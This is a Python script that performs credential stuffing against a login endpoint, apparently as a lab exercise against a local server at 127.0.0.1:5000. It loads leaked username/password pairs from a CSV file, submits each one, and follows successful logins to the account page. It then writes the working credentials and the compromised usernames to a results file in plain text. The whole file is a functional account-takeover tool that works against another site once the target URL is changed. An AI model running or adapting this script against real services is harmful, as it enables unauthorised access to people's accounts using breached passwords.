import csv
import time
from pathlib import Path
from typing import List, Dict

import requests

BASE_DIR = Path(__file__).resolve().parent
CREDENTIALS_FILE = BASE_DIR / "leaked_credentials.csv"
RESULTS_FILE = BASE_DIR / "results_log.csv"

LOGIN_URL = "http://127.0.0.1:5000/login"
ACCOUNT_URL_BASE = "http://127.0.0.1:5000/account/"


def load_leaked_credentials() -> List[Dict[str, str]]:
    """Read leaked username/password pairs from CSV."""
    rows: List[Dict[str, str]] = []
    with CREDENTIALS_FILE.open("r", encoding="utf-8", newline="") as f:
        reader = csv.DictReader(f)
        for row in reader:
            rows.append(
                {
                    "username": row["username"].strip(),
                    "password": row["password"].strip(),
                }
            )
    return rows


def write_results(results: List[Dict[str, str]], stats: Dict[str, str]) -> None:
    """Write attack simulation results and summary statistics to CSV."""
    fieldnames = [
        "attempt_id",
        "username",
        "password",
        "status",
        "account_page_accessed",
        "notes",
    ]
    with RESULTS_FILE.open("w", encoding="utf-8", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(results)

        # Blank row to separate data from summary
        f.write("\n")

        # Summary report
        f.write("SUMMARY REPORT\n")
        for key, value in stats.items():
            f.write(f"{key},{value}\n")


def main() -> None:
    leaked_pairs = load_leaked_credentials()
    results: List[Dict[str, str]] = []

    session = requests.Session()

    print("=== Starting controlled credential replay simulation ===")
    print(f"Target: {LOGIN_URL}")
    print(f"Total credential pairs: {len(leaked_pairs)}")
    print()

    success_count = 0
    failed_count = 0
    error_count = 0

    for i, item in enumerate(leaked_pairs, start=1):
        username = item["username"]
        password = item["password"]

        try:
            response = session.post(
                LOGIN_URL,
                data={"username": username, "password": password},
                allow_redirects=False,
                timeout=5,
            )
        except requests.RequestException as exc:
            print(f"[{i}] ERROR for {username}: {exc}")
            error_count += 1
            continue

        # Successful login redirects to /account/<username>
        if response.status_code in (302, 303) and "Location" in response.headers:
            location = response.headers["Location"]
            success_count += 1

            # Follow the redirect to simulate benign post-login access
            account_page_url = f"http://127.0.0.1:5000{location}"
            account_response = session.get(account_page_url, timeout=5)

            accessed = "YES" if account_response.status_code == 200 else "NO"

            print(
                f"[{i}] SUCCESS -> {username} / {password} | "
                f"Redirected to {location} | Account page accessed: {accessed}"
            )

            results.append(
                {
                    "attempt_id": str(i),
                    "username": username,
                    "password": password,
                    "status": "SUCCESS",
                    "account_page_accessed": accessed,
                    "notes": f"Redirected to {location}",
                }
            )
        else:
            failed_count += 1
            print(f"[{i}] FAIL -> {username} / {password}")

       

    # Collect compromised usernames
    compromised = sorted({r["username"] for r in results if r["status"] == "SUCCESS"})
    total = len(leaked_pairs)
    success_rate = (success_count / total * 100) if total else 0

    stats = {
        "Target URL": LOGIN_URL,
        "Total attempts": str(total),
        "Successful logins": str(success_count),
        "Failed logins": str(failed_count),
        "Errors": str(error_count),
        "Success rate": f"{success_rate:.1f}%",
        "Unique accounts compromised": str(len(compromised)),
        "Compromised users": ", ".join(compromised) if compromised else "None",
    }

    write_results(results, stats)

    print()
    print("=" * 58)
    print("  CREDENTIAL STUFFING SIMULATION — SUMMARY REPORT")
    print("=" * 58)
    print(f"  Target URL             : {LOGIN_URL}")
    print(f"  Total attempts         : {total}")
    print(f"  Successful logins      : {success_count}")
    print(f"  Failed logins          : {failed_count}")
    print(f"  Errors                 : {error_count}")
    print(f"  Success rate           : {success_rate:.1f}%")
    print("-" * 58)
    print(f"  Unique accounts compromised : {len(compromised)}")
    if compromised:
        print(f"  Compromised users           : {', '.join(compromised)}")
    print("-" * 58)
    print(f"  Results written to: {RESULTS_FILE}")
    print("=" * 58)


if __name__ == "__main__":
    main()